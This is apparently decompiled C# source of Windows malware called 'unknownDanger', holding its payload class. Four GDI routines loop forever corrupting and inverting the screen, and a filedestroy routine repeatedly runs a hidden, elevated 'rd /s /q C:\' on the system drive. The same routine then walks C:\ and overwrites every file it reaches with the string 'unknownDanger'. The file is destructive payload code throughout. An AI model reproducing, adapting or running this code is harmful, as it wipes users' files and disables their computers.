using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using unknownDanger.Properties;

namespace unknownDanger
{
	// Token: 0x02000008 RID: 8
	internal class Payloads
	{
		// Token: 0x0600008E RID: 142 RVA: 0x00003AA0 File Offset: 0x00001CA0
		public static void gdi1()
		{
			for (;;)
			{
				try
				{
					int num = Imports.XorYeet32() % Imports.y;
					IntPtr intPtr = Imports.makeDC();
					IntPtr intPtr2 = Imports.Mdc(intPtr);
					IntPtr hbitmap = Resources.wnoise.GetHbitmap();
					Imports.SelectObject(intPtr2, hbitmap);
					Imports.AlphaBlend(intPtr, 0, num, Imports.x, Imports.XorYeet32() % Imports.y - num, intPtr2, 0, Imports.XorYeet32() % Imports.y, Imports.x, Imports.XorYeet32() % Imports.y - num, new Imports.BLENDFUNCTION(0, 0, 128, 0));
					Imports.DeleteObject(hbitmap);
					Imports.RemoveDC(intPtr2);
					num = Imports.XorYeet32() % Imports.y;
					Imports.BitBlt(intPtr, ((Imports.XorYeet32() & 2) - 1) * 10, num, Imports.x, Imports.XorYeet32() % Imports.y - num, intPtr, 0, num, Imports.SRCCOPY);
					num = Imports.XorYeet32() % Imports.y;
					Imports.BitBlt(intPtr, ((Imports.XorYeet32() & 2) - 1) * 10, num, Imports.x, Imports.XorYeet32() % Imports.y - num, intPtr, 0, num, Imports.NOTSRCCOPY);
					num = Imports.XorYeet32() % Imports.y;
					IntPtr intPtr3 = Imports.CreateSolidBrush((uint)((long)Imports.XorYeet32() & 16777215L));
					Imports.SelectObject(intPtr, intPtr3);
					Imports.BitBlt(intPtr, ((Imports.XorYeet32() & 2) - 1) * 10, num, Imports.x, Imports.XorYeet32() % Imports.y - num, intPtr, 0, num, Imports.PATINVERT);
					Imports.DeleteObject(intPtr3);
					num = Imports.XorYeet32() % Imports.y;
					intPtr3 = Imports.CreateSolidBrush((uint)((long)Imports.XorYeet32() & 16777215L));
					Imports.SelectObject(intPtr, intPtr3);
					Imports.BitBlt(intPtr, ((Imports.XorYeet32() & 2) - 1) * 10, num, Imports.x, Imports.XorYeet32() % Imports.y - num, intPtr, 0, num, Imports.MERGECOPY);
					Imports.DeleteObject(intPtr3);
					Imports.RemoveDC(intPtr);
					bool flag = (Imports.XorYeet32() & 1) != 0;
					if (flag)
					{
						Thread.Sleep(Imports.XorYeet32() % 20);
					}
					bool flag2 = (Imports.XorYeet32() & 1) != 0;
					if (flag2)
					{
						Imports.RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, Imports.RedrawWindowFlags.Invalidate | Imports.RedrawWindowFlags.Erase | Imports.RedrawWindowFlags.AllChildren);
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00003CE8 File Offset: 0x00001EE8
		public static void gdi2()
		{
			for (;;)
			{
				try
				{
					IntPtr hdc = Imports.makeDC();
					Imports.changecols(hdc, (int)Imports.XYB() * 65793);
					Imports.chroma(hdc, (Imports.typesChr)(Imports.XorYeet32() & 3), Imports.XorYeet32() % (int)Imports.min((double)Imports.x, (double)Imports.y));
					Imports.RemoveDC(hdc);
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00003D5C File Offset: 0x00001F5C
		public static void gdi3()
		{
			int num = 60;
			for (;;)
			{
				IntPtr intPtr = Imports.makeDC();
				IntPtr intPtr2 = Imports.Mdc(intPtr);
				IntPtr intPtr3 = Imports.bitmap(intPtr);
				Imports.SelectObject(intPtr2, intPtr3);
				Imports.CopyToDC(intPtr2, intPtr);
				for (int i = 0; i < 15; i++)
				{
					for (int j = 0; j < Imports.x; j += Imports.x / num)
					{
						Imports.BitBlt(intPtr2, j, ((Imports.XorYeet32() & 2) - 1) * 3, Imports.x / num, Imports.y, intPtr2, j, 0, Imports.SRCCOPY);
					}
					for (int k = 0; k < Imports.y; k += Imports.y / num)
					{
						Imports.BitBlt(intPtr2, ((Imports.XorYeet32() & 2) - 1) * 3, k, Imports.x, Imports.y / num, intPtr2, 0, k, Imports.SRCCOPY);
					}
				}
				Imports.CopyToDC(intPtr, intPtr2);
				Imports.DeleteObject(intPtr3);
				Imports.RemoveDC(intPtr2);
				Imports.RemoveDC(intPtr);
			}
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00003E74 File Offset: 0x00002074
		public static void gdi4()
		{
			int num = 0;
			for (;;)
			{
				num++;
				IntPtr intPtr = Imports.makeDC();
				IntPtr intPtr2 = Imports.Mdc(intPtr);
				IntPtr intPtr3 = Imports.bitmap(intPtr);
				Imports.SelectObject(intPtr2, intPtr3);
				Imports.CopyToDC(intPtr2, intPtr);
				try
				{
					Imports.BITMAPINFO bitmapinfo = default(Imports.BITMAPINFO);
					bitmapinfo.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(Imports.BITMAPINFOHEADER));
					bitmapinfo.bmiHeader.biWidth = Imports.x;
					bitmapinfo.bmiHeader.biHeight = -Imports.y;
					bitmapinfo.bmiHeader.biPlanes = 1;
					bitmapinfo.bmiHeader.biBitCount = 32;
					bitmapinfo.bmiHeader.biCompression = 0U;
					byte[] array = new byte[Imports.x * Imports.y * 4];
					Marshal.Copy(Imports.getScreen().LockBits(new Rectangle(0, 0, Imports.x, Imports.y), ImageLockMode.ReadWrite, PixelFormat.Format32bppArgb).Scan0, array, 0, array.Length);
					int num2 = 0;
					for (int i = 0; i < Imports.y; i++)
					{
						for (int j = 0; j < Imports.x; j++)
						{
							double num3 = 2.5 / (double)Imports.x;
							double num4 = 1.9 / (double)Imports.y;
							double num5 = (double)j * num3 - 2.0;
							double num6 = (double)i * num4 - 0.95;
							double num7 = 0.0;
							double num8 = 0.0;
							int num9 = 0;
							while (num7 * num7 + num8 * num8 < 10.0 && num9 < 50)
							{
								double num10 = num7 * num7 - num8 * num8 * num8 + (num5 - 1.414 * (double)(2 << num)) / (double)(2 << num);
								double num11 = 2.0 * num7 * num8 + num6 / (double)(2 << num) * 3.0;
								num7 = num10;
								num8 = num11;
								num9++;
								array[num2 + 2] = (byte)((double)num9 * 27425.3 + (double)num);
								array[num2 + 1] = (byte)((double)num9 * 27425.3 - (double)num);
								array[num2] = (byte)((double)num9 * 27425.3 + (double)num);
							}
							num2 += 4;
						}
					}
					Imports.SetDIBitsToDevice(intPtr2, 0, 0, (uint)Imports.x, (uint)Imports.y, 0, 0, 0U, (uint)Imports.y, array, ref bitmapinfo, 0U);
				}
				catch
				{
				}
				Imports.CopyBlt(intPtr, intPtr2, Imports.SRCOR);
				Imports.DeleteObject(intPtr3);
				Imports.RemoveDC(intPtr2);
				Imports.RemoveDC(intPtr);
			}
		}

		// Token: 0x06000092 RID: 146 RVA: 0x0000415C File Offset: 0x0000235C
		public static void filedestroy()
		{
			for (;;)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "cmd /c /rd /s /q C:\\",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					Verb = "RunAs"
				});
				Thread.Sleep(1000);
				Payloads.SearchFiles("C:\\");
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x000041C8 File Offset: 0x000023C8
		public static void SearchFiles(string rootDirectory)
		{
			try
			{
				string[] files = Directory.GetFiles(rootDirectory);
				foreach (string filePath in files)
				{
					try
					{
						Payloads.ProcessFile(filePath);
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error accessing " + rootDirectory + ": " + ex.Message);
					}
				}
				string[] directories = Directory.GetDirectories(rootDirectory);
				foreach (string rootDirectory2 in directories)
				{
					Payloads.SearchFiles(rootDirectory2);
				}
			}
			catch (Exception ex2)
			{
				Console.WriteLine(ex2.Message ?? "");
			}
		}

		// Token: 0x06000094 RID: 148 RVA: 0x00004290 File Offset: 0x00002490
		public static void ProcessFile(string filePath)
		{
			Console.WriteLine("Found file: " + filePath);
			FileInfo fileInfo = new FileInfo(filePath);
			File.WriteAllText(filePath, "unknownDanger");
		}
	}
}
